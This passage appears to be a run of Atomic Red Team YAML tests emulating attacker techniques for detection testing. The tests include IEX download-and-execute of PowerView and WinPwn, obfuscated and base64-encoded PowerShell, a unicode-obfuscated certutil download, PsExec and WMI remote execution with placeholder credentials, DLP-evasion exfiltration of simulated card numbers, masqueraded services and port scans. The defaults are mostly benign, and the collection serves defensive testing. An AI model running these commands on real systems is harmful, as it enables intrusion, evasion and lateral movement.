    command: |
      reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} -f
      netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}
    cleanup_command: |
      reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d #{OLD_Remote_Port} -f >nul 2>&1
      netsh advfirewall firewall delete rule name="RDPPORTLatest-TCP-In" >nul 2>&1
    name: command_prompt
    elevation_required: true    



- name: Map admin share
  auto_generated_guid: 3386975b-367a-4fbb-9d77-4dcf3639ffd3
  description: |
    Connecting To Remote Shares
  supported_platforms:
  - windows
  input_arguments:
    user_name:
      description: Username
      type: String
      default: DOMAIN\Administrator
    share_name:
      description: Examples C$, IPC$, Admin$
      type: String
      default: C$
    password:
      description: Password
      type: String
      default: P@ssw0rd1
    computer_name:
      description: Target Computer Name
      type: String
      default: Target
  executor:
    command: |
      cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}"
    name: command_prompt
- name: Map Admin Share PowerShell
  auto_generated_guid: 514e9cd7-9207-4882-98b1-c8f791bae3c5
  description: |
    Map Admin share utilizing PowerShell
  supported_platforms:
  - windows
  input_arguments:
    share_name:
      description: Examples C$, IPC$, Admin$
      type: String
      default: C$
    map_name:
      description: Mapped Drive Letter
      type: String
      default: g
    computer_name:
      description: Target Computer Name
      type: String
      default: Target
  executor:
    command: |
      New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
    name: powershell
- name: Copy and Execute File with PsExec
  auto_generated_guid: 0eb03d41-79e4-4393-8e57-6344856be1cf
  description: |
    Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).
  supported_platforms:
  - windows
  input_arguments:
    command_path:
      description: File to copy and execute
      type: Path
      default: C:\Windows\System32\cmd.exe
    remote_host:
      description: Remote computer to receive the copy and execute the file
      type: String
      default: '\\localhost'
    psexec_exe:
      description: Path to PsExec
      type: string
      default: C:\PSTools\PsExec.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})
    prereq_command: |
      if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
    get_prereq_command: |
      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
      New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
  executor:
    command: |
      #{psexec_exe} #{remote_host} -accepteula -c #{command_path}
    name: command_prompt
    elevation_required: true
- name: Execute command writing output to local Admin Share
  auto_generated_guid: d41aaab5-bdfe-431d-a3d5-c29e9136ff46
  description: |
    Executes a command, writing the output to a local Admin Share.
    This technique is used by post-exploitation frameworks.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Remote computer to receive the copy and execute the file
      type: String
      default: output.txt
    command_to_execute:
      description: Command to execute for output.
      type: String
      default: hostname
  executor:
    command: |
      cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1
    name: command_prompt
    elevation_required: true



- name: Decode base64 Data into Script
  auto_generated_guid: f45df6be-2e1e-4136-a384-8f18ab3826fb
  description: |
    Creates a base64-encoded data file and decodes it into an executable shell script

    Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` 
    and uname -v
  supported_platforms:
  - macos
  - linux
  input_arguments:
    shell_command:
      description: command to encode
      type: String
      default: "echo Hello from the Atomic Red Team && uname -v"
  dependency_executor_name: sh
  dependencies:
  - description: |
      encode the command into base64 file
    prereq_command: |
      exit 1
    get_prereq_command: |
      echo "#{shell_command}" | base64 > /tmp/encoded.dat
  executor:
    command: |
      cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
      chmod +x /tmp/art.sh
      /tmp/art.sh
    cleanup_command: |
      rm /tmp/encoded.dat 
      rm /tmp/art.sh
    name: sh
- name: Execute base64-encoded PowerShell
  auto_generated_guid: a50d5a97-2531-499e-a1de-5544c74432c6
  description: |
    Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.

    Upon successful execution, powershell will execute an encoded command and stdout default is "Write-Host "Hey, Atomic!"
  supported_platforms:
  - windows
  input_arguments:
    powershell_command:
      description: PowerShell command to encode
      type: String
      default: Write-Host "Hey, Atomic!"
  executor:
    command: |
      $OriginalCommand = '#{powershell_command}'
      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
      $EncodedCommand =[Convert]::ToBase64String($Bytes)
      $EncodedCommand
      powershell.exe -EncodedCommand $EncodedCommand
    name: powershell
- name: Execute base64-encoded PowerShell from Windows Registry
  auto_generated_guid: 450e7218-7915-4be4-8b9b-464a49eafcec
  description: |
    Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.

    Upon successful execution, powershell will execute encoded command and read/write from the registry.
  supported_platforms:
  - windows
  input_arguments:
    registry_key_storage:
      description: Windows Registry Key to store code
      type: String
      default: HKCU:Software\Microsoft\Windows\CurrentVersion
    powershell_command:
      description: PowerShell command to encode
      type: String
      default: Write-Host "Hey, Atomic!"
    registry_entry_storage:
      description: Windows Registry entry to store code under key
      type: String
      default: Debug
  executor:
    command: |
      $OriginalCommand = '#{powershell_command}'
      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
      $EncodedCommand =[Convert]::ToBase64String($Bytes)
      $EncodedCommand

      Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
      powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"
    cleanup_command: |
      Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}
    name: powershell
- name: Execution from Compressed File
  auto_generated_guid: f8c8a909-5f29-49ac-9244-413936ce6d1f
  description: |
    Mimic execution of compressed executable. When successfully executed, calculator.exe will open.
  supported_platforms:
  - windows
  input_arguments:
    url_path:
      description: url to download Exe
      type: Url
      default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
  dependency_executor_name: powershell
  dependencies:
  - description: |
      T1027.exe must exist on disk at $env:temp\temp_T1027.zip\T1027.exe
    prereq_command: |
      if (Test-Path $env:temp\temp_T1027.zip\T1027.exe) {exit 0} else {exit 1}
    get_prereq_command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
      Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
  executor:
    command: |
      "%temp%\temp_T1027.zip\T1027.exe"
    cleanup_command: |
      taskkill /f /im calculator.exe >nul 2>nul
      rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul
      del /Q "%temp%\T1027.zip" >nul 2>nul
    name: command_prompt
- name: DLP Evasion via Sensitive Data in VBA Macro over email
  auto_generated_guid: 129edb75-d7b8-42cd-a8ba-1f3db64ec4ad
  description: |
    Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.
    Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
  supported_platforms:
  - windows
  input_arguments:
    input_file:
      description: Path of the XLSM file
      type: Path
      default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
    sender:
      description: sender email
      type: String
      default: test@corp.com
    receiver:
      description: receiver email
      type: String
      default: test@corp.com
    smtp_server:
      description: SMTP Server IP Address
      type: String
      default: 127.0.0.1
  executor:
    command: |
      Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments #{input_file} -SmtpServer #{smtp_server}
    name: powershell
- name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
  auto_generated_guid: e2d85e66-cb66-4ed7-93b1-833fc56c9319
  description: |
    Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.
    Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
  supported_platforms:
  - windows
  input_arguments:
    input_file:
      description: Path of the XLSM file
      type: Path
      default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
    ip_address:
      description: Destination IP address
      type: String
      default: 127.0.0.1
  executor:
    command: |
      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}
    name: powershell
- name: Obfuscated Command in PowerShell
  auto_generated_guid: 8b3f4ed6-077b-4bdd-891c-2d237f19410f
  description: |
    This is an obfuscated PowerShell command which when executed prints "Hello, from PowerShell!". Example is from the 2021 Threat Detection Report by Red Canary.
  supported_platforms:
  - windows
  executor:
    command: |
      $cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )
    name: powershell
- name: Obfuscated Command Line using special Unicode characters
  auto_generated_guid: e68b945c-52d0-4dd9-a5e8-d173d70c448f
  description: |
    This is an obfuscated certutil command that when executed downloads a file from the web. Adapted from T1105. Obfuscation includes special options chars (unicode hyphens), character substitution (e.g. ᶠ) and character insertion (including the usage of the right-to-left 0x202E and left-to-right 0x202D override characters).
    Reference:
    https://wietze.github.io/blog/windows-command-line-obfuscation
  supported_platforms:
  - windows
  input_arguments:
    remote_file:
      description: URL of file to download
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    local_path:
      description: Local path/filename to save the dowloaded file to
      type: Path
      default: Atomic-license.txt
  executor:
    steps: |
      1. Copy the following command into the command prompt after replacing #{remote_file} and #{local_path} with your desired URL and filename.


        certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −"൏ᶠ൸" #{remote_file} #{local_path}


      2. Press enter to execute the command. You will find the file or webpage you specified saved to the file you specified in the command.

    name: manual



- name: System Owner/User Discovery
  auto_generated_guid: 4c4959bf-addf-4b4a-be86-8d09cc1857aa
  description: |
    Identify System owner or users on an endpoint.

    Upon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. 
    Additionally, two files will be written to disk - computers.txt and usernames.txt.
  supported_platforms:
  - windows
  input_arguments:
    computer_name:
      description: Name of remote computer
      type: String
      default: localhost
  executor:
    command: |
      cmd.exe /C whoami
      wmic useraccount get /ALL
      quser /SERVER:"#{computer_name}"
      quser
      qwinsta.exe /server:#{computer_name}
      qwinsta.exe
      for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt
      @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
    name: command_prompt
- name: System Owner/User Discovery
  auto_generated_guid: 2a9b677d-a230-44f4-ad86-782df1ef108c
  description: |
    Identify System owner or users on an endpoint

    Upon successful execution, sh will stdout list of usernames.
  supported_platforms:
  - linux
  - macos
  executor:
    command: |
      users
      w
      who
    name: sh
- name: Find computers where user has session - Stealth mode (PowerView)
  auto_generated_guid: 29857f27-a36f-4f7e-8084-4557cd6207ca
  description: Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.
  supported_platforms:
  - windows
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
    name: powershell
- name: User Discovery With Env Vars PowerShell Script
  auto_generated_guid: dcb6cdee-1fb0-4087-8bf8-88cfd136ba51
  description: Use the PowerShell environment variables to identify the current logged user.
  supported_platforms:
  - windows
  executor:
    command: |
      [System.Environment]::UserName | Out-File -FilePath .\CurrentactiveUser.txt 
      $env:UserName | Out-File -FilePath .\CurrentactiveUser.txt -Append
    cleanup_command: |
      Remove-Item -Path .\CurrentactiveUser.txt -Force
    name: powershell
- name: GetCurrent User with PowerShell Script
  auto_generated_guid: 1392bd0f-5d5a-429e-81d9-eb9d4d4d5b3b
  description: Use the PowerShell "GetCurrent" method of the WindowsIdentity .NET class to identify the logged user.
  supported_platforms:
  - windows
  executor:
    command: |
      [System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt
    cleanup_command: |
      Remove-Item -Path .\CurrentUserObject.txt -Force
    name: powershell



- name: Creating W32Time similar named service using schtasks
  auto_generated_guid: f9f2fe59-96f7-4a7d-ba9f-a9783200d4c9
  description: Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed "Operation Wocao"
  supported_platforms:
  - windows
  executor:
    command: |
      schtasks /create /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1" /tn win32times /f
      schtasks /query /tn win32times
    cleanup_command: |
      schtasks /tn win32times /delete /f
    name: command_prompt
    elevation_required: true
- name: Creating W32Time similar named service using sc
  auto_generated_guid: b721c6ef-472c-4263-a0d9-37f1f4ecff66
  description: Creating W32Time similar named service (win32times) using sc just like threat actor dubbed "Operation Wocao"
  supported_platforms:
  - windows
  executor:
    command: |
      sc create win32times binPath= "cmd /c start c:\T1036.004_NonExistingScript.ps1"
      sc qc win32times
    cleanup_command: |
      sc delete win32times
    name: command_prompt
    elevation_required: true



- name: Execute a process from a directory masquerading as the current parent directory.
  auto_generated_guid: 812c3ab8-94b0-4698-a9bf-9420af23ce24
  description: |
    Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)
  supported_platforms:
    - macos
    - linux
  input_arguments:
    test_message:
      description: Test message to echo out to the screen
      type: String
      default: Hello from the Atomic Red Team test T1036.005#1
  executor:
    name: sh
    elevation_required: false
    command: |
      mkdir $HOME/...
      cp $(which sh) $HOME/...
      $HOME/.../sh -c "echo #{test_message}"
    cleanup_command: |
      rm -f $HOME/.../sh
      rmdir $HOME/.../
- name: Masquerade as a built-in system executable
  auto_generated_guid: 35eb8d16-9820-4423-a2a1-90c4f5edd9ca
  description: |
    Launch an executable that attempts to masquerade as a legitimate executable.
  supported_platforms:
  - windows
  input_arguments:
    executable_filepath:
      description: File path where the generated executable will be dropped and executed from. The filename should be the name of a built-in system utility.
      type: String
      default: $Env:windir\Temp\svchost.exe
  executor:
    command: |
      Add-Type -TypeDefinition @'
      public class Test {
          public static void Main(string[] args) {
              System.Console.WriteLine("tweet, tweet");
          }
      }
      '@ -OutputAssembly "#{executable_filepath}"
      
      Start-Process -FilePath "#{executable_filepath}"
    cleanup_command: |
      Remove-Item -Path "#{executable_filepath}" -ErrorAction Ignore
    name: powershell



- name: Port Scan
  auto_generated_guid: 68e907da-2539-48f6-9fc9-257a78c05540
  description: |
    Scan ports to check for listening ports.

    Upon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.
  supported_platforms:
  - linux
  - macos
  input_arguments:
    host:
      description: Host to scan.
      type: String
      default: 192.168.1.1
  executor:
    command: |
      for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
    name: bash
- name: Port Scan Nmap
  auto_generated_guid: 515942b0-a09f-4163-a7bb-22fefb6f185f
  description: |
    Scan ports to check for listening ports with Nmap.

    Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of adresseses on port 80 to determine if listening. Results will be via stdout.
  supported_platforms:
  - linux
  - macos
  input_arguments:
    host:
      description: Host to scan.
      type: String
      default: 192.168.1.1
    port:
      description: Ports to scan.
      type: String
      default: "80"
    network_range:
      description: Network Range to Scan.
      type: String
      default: 192.168.1.0/24
  dependency_executor_name: sh
  dependencies:
  - description: |
      Check if nmap command exists on the machine
    prereq_command: |
      if [ -x "$(command -v nmap)" ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)
  - description: |
      Check if nc command exists on the machine
    prereq_command: |
      if [ -x "$(command -v nc)" ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)
  - description: |
      Check if telnet command exists on the machine
    prereq_command: |
      if [ -x "$(command -v telnet)" ]; then exit 0; else exit 1; fi;
    get_prereq_command: |
      (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)
  executor:
    command: |
      sudo nmap -sS #{network_range} -p #{port}
      telnet #{host} #{port}
      nc -nv #{host} #{port}
    name: sh
    elevation_required: true
- name: Port Scan NMap for Windows
  auto_generated_guid: d696a3cb-d7a8-4976-8eb5-5af4abf2e3df
  description: Scan ports to check for listening ports for the local host 127.0.0.1
  supported_platforms:
  - windows
  input_arguments:
    nmap_url:
      description: NMap installer download URL
      type: Url
      default: https://nmap.org/dist/nmap-7.80-setup.exe
    host_to_scan:
      description: The host to scan with NMap
      type: String
      default: 127.0.0.1
  dependency_executor_name: powershell
  dependencies:
  - description: |
      NMap must be installed
    prereq_command: 'if (cmd /c "nmap 2>nul") {exit 0} else {exit 1}'
    get_prereq_command: |
      Invoke-WebRequest -OutFile $env:temp\nmap-7.80-setup.exe #{nmap_url}
      Start-Process $env:temp\nmap-7.80-setup.exe /S
  executor:
    command: |-
      nmap #{host_to_scan}
    name: powershell
    elevation_required: true
- name: Port Scan using python
  auto_generated_guid: 6ca45b04-9f15-4424-b9d3-84a217285a5c
  description: |
    Scan ports to check for listening ports with python
  supported_platforms:
  - windows
  input_arguments:
    host_ip:
      description: Host to scan.
      type: String
      default: 127.0.0.1
    filename:
      description: Location of the project file
      type: Path
      default: PathToAtomicsFolder\T1046\src\T1046.py
  dependency_executor_name: powershell
  dependencies:
    - description: |
        Check if python exists on the machine
      prereq_command: |
        if (python --version) {exit 0} else {exit 1}
      get_prereq_command: |
        echo "Python 3 must be installed manually"
  executor:
    command: |
      python #{filename} -i #{host_ip}
    name: powershell
- name: WinPwn - spoolvulnscan
  auto_generated_guid: 54574908-f1de-4356-9021-8053dd57439a
  description: Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      spoolvulnscan -noninteractive -consoleoutput
    name: powershell
- name: WinPwn - MS17-10
  auto_generated_guid: 97585b04-5be2-40e9-8c31-82157b8af2d6
  description: Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      MS17-10 -noninteractive -consoleoutput
    name: powershell
- name: WinPwn - bluekeep
  auto_generated_guid: 1cca5640-32a9-46e6-b8e0-fabbe2384a73
  description: Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      bluekeep -noninteractive -consoleoutput
    name: powershell
- name: WinPwn - fruit
  auto_generated_guid: bb037826-cbe8-4a41-93ea-b94059d6bb98
  description: Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn
  supported_platforms:
  - windows
  executor:
    command: |-
      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
      fruit -noninteractive -consoleoutput
    name: powershell



- name: WMI Reconnaissance Users
  auto_generated_guid: c107778c-dcf5-47c5-af2e-1d058a3df3ea
  description: |
    An adversary might use WMI to list all local User Accounts. 
    When the test completes , there should be local user accounts information displayed on the command line.
  supported_platforms:
  - windows
  executor:
    command: |
      wmic useraccount get /ALL /format:csv
    name: command_prompt
- name: WMI Reconnaissance Processes
  auto_generated_guid: 5750aa16-0e59-4410-8b9a-8a47ca2788e2
  description: |
    An adversary might use WMI to list Processes running on the compromised host.
    When the test completes , there should be running processes listed on the command line.
  supported_platforms:
  - windows
  executor:
    command: |
      wmic process get caption,executablepath,commandline /format:csv
    name: command_prompt
- name: WMI Reconnaissance Software
  auto_generated_guid: 718aebaa-d0e0-471a-8241-c5afa69c7414
  description: |
    An adversary might use WMI to list installed Software hotfix and patches.
    When the test completes, there should be a list of installed patches and when they were installed.
  supported_platforms:
  - windows
  executor:
    command: |
      wmic qfe get description,installedOn /format:csv
    name: command_prompt
- name: WMI Reconnaissance List Remote Services
  auto_generated_guid: 0fd48ef7-d890-4e93-a533-f7dedd5191d3
  description: |
    An adversary might use WMI to check if a certain Remote Service is running on a remote device. 
    When the test completes, a service information will be displayed on the screen if it exists.
    A common feedback message is that "No instance(s) Available" if the service queried is not running.
    A common error message is "Node - (provided IP or default)  ERROR Description =The RPC server is unavailable" 
    if the provided remote host is unreacheable
  supported_platforms:
  - windows
  input_arguments:
    node:
      description: Ip Address
      type: String
      default: 127.0.0.1
    service_search_string:
      description: Name Of Service
      type: String
      default: Spooler
  executor:
    command: |
      wmic /node:"#{node}" service where (caption like "%#{service_search_string}%")
    name: command_prompt
- name: WMI Execute Local Process
  auto_generated_guid: b3bdfc91-b33e-4c6d-a5c8-d64bee0276b3
  description: |
    This test uses wmic.exe to execute a process on the local host.
    When the test completes , a new process will be started locally .A notepad application will be started when input is left on default.
  supported_platforms:
  - windows
  input_arguments:
    process_to_execute:
      description: Name or path of process to execute.
      type: String
      default: notepad.exe
  executor:
    command: |
      wmic process call create #{process_to_execute}
    cleanup_command: |
      wmic process where name='#{process_to_execute}' delete >nul 2>&1
    name: command_prompt
- name: WMI Execute Remote Process
  auto_generated_guid: 9c8ef159-c666-472f-9874-90c8d60d136b
  description: |
    This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.
    To clean up, provide the same node input as the one provided to run the test
    A common error message is "Node - (provided IP or default)  ERROR Description =The RPC server is unavailable" if the default or provided IP is unreachable
  supported_platforms:
  - windows
  input_arguments:
    node:
      description: Ip Address
      type: String
      default: 127.0.0.1
    user_name:
      description: Username
      type: String
      default: DOMAIN\Administrator
    password:
      description: Password
      type: String
      default: P@ssw0rd1
    process_to_execute:
      description: Name or path of process to execute.
      type: String
      default: notepad.exe
  executor:
    command: |
      wmic /user:#{user_name} /password:#{password} /node:"#{node}" process call create #{process_to_execute}
    cleanup_command: |
      wmic /user:#{user_name} /password:#{password} /node:"#{node}" process where name='#{process_to_execute}' delete >nul 2>&1
    name: command_prompt
- name: Create a Process using WMI Query and an Encoded Command
  auto_generated_guid: 7db7a7f9-9531-4840-9b30-46220135441c
  description: |
    Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand
     Powershell -nop -exec bypass -EncodedCommand <encoded command>
    Where the –EncodedCommand, once decoded, would resemble:
      Invoke-WMIMethod win32_process -name create -argumentlist ‘rundll32 c:\windows\idmu\common\ypprop.dll _XInitImageFuncPtrs’ -ComputerName WORKSTATION
    The EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
    You should expect to see notepad.exe running after execution of this test.
    [Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)
  supported_platforms:
  - windows
  executor:
    command: |
      powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
    name: command_prompt
- name: Create a Process using obfuscated Win32_Process
  auto_generated_guid: 10447c83-fc38-462a-a936-5102363b1c43
  description: |
    This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.
    [Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)
  supported_platforms:
  - windows
  input_arguments:
    new_class:
      description: Derived class name
      type: String
      default: Win32_Atomic
    process_to_execute:
      description: Name or path of process to execute.
      type: String
      default: notepad.exe
  executor:
    name: powershell
    elevation_required: true
    command: |
      $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
      $NewClass = $Class.Derive("#{new_class}")
      $NewClass.Put()
      Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
    cleanup_command: |
      $CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath("#{new_class}"))
      try { $CleanupClass.Delete() } catch {}
- name: WMI Execute rundll32
  auto_generated_guid: 00738d2a-4651-4d76-adf2-c43a41dfb243
  description: |
    This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.
  supported_platforms:
  - windows
  input_arguments:
    node:
      description: Ip Address
      type: String
      default: 127.0.0.1
    dll_to_execute:
      description: Path to DLL.
      type: String
      default: $env:TEMP\calc.dll
    function_to_execute:
      description: Name of DLL function to call
      type: String
      default: StartW
  dependency_executor_name: powershell
  dependencies:
  - description: DLL with function to execute must exist on disk at specified location (#{dll_to_execute})
    prereq_command: 'if (Test-Path #{dll_to_execute}) {exit 0} else {exit 1}'
    get_prereq_command: |
      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/bin/calc.dll?raw=true" -OutFile "#{dll_to_execute}"
  executor:
    command: |
      wmic /node:#{node} process call create "rundll32.exe #{dll_to_execute} #{function_to_execute}"
    cleanup_command: |-
      taskkill /f /im calculator.exe
    name: powershell
- name: Application uninstall using WMIC
  auto_generated_guid: c510d25b-1667-467d-8331-a56d3e9bc4ff
  description: Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.
  supported_platforms:
  - windows
  input_arguments:
    node:
      description: Computer the action is being executed against but defaults to the localhost.
      type: string
      default: 127.0.0.1
    product:
      description: Enter the product name being uninstalled.  This will default to TightVNC.
      type: String
      default: Tightvnc
  dependency_executor_name: powershell
  dependencies:
  - description: TightVNC must be installed.
    prereq_command: if ((Test-Path "C:\Program Files\TightVNC\tvnviewer.exe")-Or (Test-Path "C:\Program Files (x86)\TightVNC\tvnviewer.exe")) {exit 0} else {exit 1}
    get_prereq_command: |-
      Invoke-WebRequest 'https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi' -OutFile PathToAtomicsFolder\T1047\bin\tightvncinstaller.msi
      start-sleep -s 10
      msiexec /i PathToAtomicsFolder\T1047\bin\tightvncinstaller.msi /qn /norestart
      start-sleep -s 15
  executor:
    command: wmic /node:"#{node}" product where "name like '#{product}%%'" call uninstall
    cleanup_command: msiexec /i PathToAtomicsFolder\T1047\bin\tightvncinstaller.msi /qn /norestart
    name: command_prompt
    elevation_required: true



- name: System Network Connections Discovery
  auto_generated_guid: 0940a971-809a-48f1-9c4d-b1d785e96ee5
  description: |
    Get a listing of network connections.

    Upon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.
  supported_platforms:
  - windows
  executor:
    command: |
      netstat
      net use
      net sessions
    name: command_prompt
- name: System Network Connections Discovery with PowerShell
  auto_generated_guid: f069f0f1-baad-4831-aa2b-eddac4baac4a
  description: |
    Get a listing of network connections.

    Upon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.
  supported_platforms:
  - windows
  executor:
    command: |
      Get-NetTCPConnection
    name: powershell
- name: System Network Connections Discovery Linux & MacOS
